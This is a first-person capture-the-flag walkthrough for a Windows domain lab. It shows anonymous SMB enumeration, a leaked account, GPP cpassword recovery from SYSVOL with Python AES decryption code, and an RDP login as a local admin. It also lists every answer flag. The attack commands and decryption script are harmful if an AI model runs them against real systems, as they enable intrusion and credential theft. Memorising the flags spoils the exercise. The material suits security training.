# Mission 3 — Walkthrough (the steps I took)

**Seat:** WKS-L65 (`10.50.0.65`), seat 65 · **Domain:** `hamilton.corp` (NetBIOS `HAMILTON`) · **DC:** DC01 (`10.50.0.10`)
**Attack machine:** my own laptop over Tailscale; tools run from WSL (Ubuntu) — `nmap`, `smbclient`, `impacket`, `xfreerdp`, `python3`.
**Scenario:** my own account was disabled, so I couldn't RDP in. I chained the weaknesses already present on the machine and the domain to get back in with admin rights, then collected proof.

Flag pattern: everything is `HAM{...}` and per-seat (`_seat65`), except Recon which is a static service name.

---

## Stage 0 — Recon  → `HAM{microsoft-ds}`

Scan the box and see what still answers:

```bash
nmap -Pn -p- 10.50.0.65
```

- Only **445 (SMB)** and **3389 (RDP)** are open. RDP is what I *used* to reach — it now rejects me (account disabled). SMB is still listening and doesn't force me to authenticate.
- A full scan (external and from the box itself) shows nothing hidden: 135/139/445 locally, 3389 above 1000, nothing else.

List shares anonymously to confirm the way in:

```bash
smbclient -L //10.50.0.65 -N
# ADMIN$  C$  IPC$  Public   <- Public is the non-default share
```

**Recon flag = the official IANA service name of port 445**, i.e. what "SMB" is really registered as:

```
microsoft-ds        445/tcp     (Microsoft Naked CIFS, per /etc/services)
```

→ **`HAM{microsoft-ds}`**  (static — no seat number).

---

## Stage 1 — First foothold (anonymous SMB)  → `HAM{anon_smb_seat65}`

The `Public` share allows a guest/null session. It holds one file left in the open:

```bash
smbclient //10.50.0.65/Public -N -c "ls"
smbclient //10.50.0.65/Public -N -c "get account-access.txt"
```

`account-access.txt` contains a working **domain training account** (strip the trailing `\r`):

- Username: **`training01`**
- Password: **`<training-account-password>`** *(redacted — real value in private notes)*

This account is enabled on the DC (mine is not), so it's my pivot.

→ **`HAM{anon_smb_seat65}`**

---

## Stage 2 — The climax: GPP cpassword in SYSVOL  → `HAM{gpp_cpassword_seat65}`

`training01` can read **SYSVOL** (the share every domain machine reads for Group Policy). LDAP/389 is firewalled on the DC, so I go over SMB/445. Add `--option="client signing=off"` to dodge an smbclient signing quirk:

```bash
smbclient //10.50.0.10/SYSVOL -U 'HAMILTON\training01%<password>' \
  --option="client signing=off" \
  -c "prompt OFF; recurse ON; mget *"
```

Under `...\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml` there are **17** files (one per seat, WKS-L50..L68). Every one sets a local admin account **`svc_deploy`** on its workstation, and each carries that seat's flag in an XML comment.

- **The Stage-2 flag is the XML comment** in my seat's `Groups.xml` → **`HAM{gpp_cpassword_seat65}`**
- seat65 `cpassword`: `<redacted-cpassword>` *(real value in private notes)*

### Decrypting the cpassword (lab uses a CUSTOM AES key, not MS14-025)

The published Microsoft GPP key does **not** work here — the lab published its own AES-256 key. Scheme: url-safe base64 → AES-256-CBC, zero IV → UTF-16LE → strip PKCS7.

```python
import base64
from Crypto.Cipher import AES

KEY = bytes.fromhex("<custom-lab-AES-256-key-hex>")   # redacted
cpw = "<cpassword-from-Groups.xml>"                    # redacted

b64 = cpw.replace('-', '+').replace('_', '/')
b64 += '=' * ((4 - len(b64) % 4) % 4)
ct = base64.b64decode(b64)
pt = AES.new(KEY, AES.MODE_CBC, b'\x00'*16).decrypt(ct)
pt = pt[:-pt[-1]]                      # strip PKCS7
print(pt.decode('utf-16-le'))          # -> the svc_deploy password
```

Result: **`WKS-L65\svc_deploy` / `<svc_deploy-password>`** (local admin, RID 1009). Confirmed over SMB (`getusername` → svc_deploy/WKS-L65; wrong password → LOGON_FAILURE). `C$` over SMB stays denied by UAC local-account token filtering — expected, and it does not block interactive RDP.

---

## Stage 3 — Privileged return (RDP as the local admin)  → `HAM{admin_rdp_seat65}`

Log back into my own workstation as the recovered local admin. Note the `.\` prefix (local account, not `HAMILTON\`):

- **mstsc** → Computer `10.50.0.65`, User `.\svc_deploy`, Password `<svc_deploy-password>`, accept the cert warning.
- If NLA/CredSSP refuses, force the RDP security mode:

```bash
xfreerdp /u:'svc_deploy' /d:'WKS-L65' /p:'<svc_deploy-password>' /v:10.50.0.65 /sec:rdp /cert:ignore
```

svc_deploy is a local admin → I land on my own desktop with admin rights. The "Access restored" proof is the Stage-3 flag → **`HAM{admin_rdp_seat65}`**.

---

## Stage 4 — Proof on the desktop  → `HAM{desktop_proof_seat65}`

Three things were waiting on the desktop:

- **`proof_of_access.txt`** → **`HAM{desktop_proof_seat65}`**
- **`monitoring-access.txt`** → a login for my Sentinel (account + password, both redacted here). Left in the open → **rotate it immediately** on first sign-in.
- **`staging\employees.csv`** → employee records (employee_id, full_name, email, department, **salary**) tagged `EXFIL-TEST-MARKER-M3` — an intruder's staged-exfil set. Personal data + salary → treat as a reportable breach (GDPR Art. 33/34; NIS2 24h/72h/1-month).

---

## The chain, in one line

anonymous SMB (`Public`) → leaked `training01` domain account → GPP `cpassword` in SYSVOL (custom AES key) → local admin `svc_deploy` → RDP back in with admin rights → collected the proof and the staged data.

## Flags

| # | Challenge | Flag |
|---|---|---|
| 23 | Recon | `HAM{microsoft-ds}` |
| 24 | First foothold | `HAM{anon_smb_seat65}` |
| 25 | The climax | `HAM{gpp_cpassword_seat65}` |
| 26 | Privileged return | `HAM{admin_rdp_seat65}` |
| 27 | Proof on the desktop | `HAM{desktop_proof_seat65}` |
